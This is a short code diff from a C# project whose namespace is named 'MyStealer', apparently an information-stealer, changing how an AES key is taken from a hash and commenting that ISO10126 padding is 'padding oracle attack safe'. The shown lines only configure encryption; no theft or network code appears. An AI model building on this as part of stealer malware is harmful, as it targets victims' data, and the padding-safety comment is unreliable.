@@ -61,13 +61,14 @@ namespace MyStealer
             var buffer = hash.ComputeHash(key);
 
             var _key = new byte[KeyLength];
-            Buffer.BlockCopy(buffer, 0, _key, 0, KeyLength);
+            // hash: <16 bytes (ignored)><32 bytes (key)><16 bytes (ignored)>
+            Buffer.BlockCopy(buffer, buffer.Length / 4, _key, 0, KeyLength);
 
             var aes = Aes.Create();
             aes.Key = _key;
             aes.IV = iv;
             aes.Mode = CipherMode.CFB;
-            aes.Padding = PaddingMode.ISO10126;
+            aes.Padding = PaddingMode.ISO10126; // Padding oracle attack safe
 
             return aes;
         }
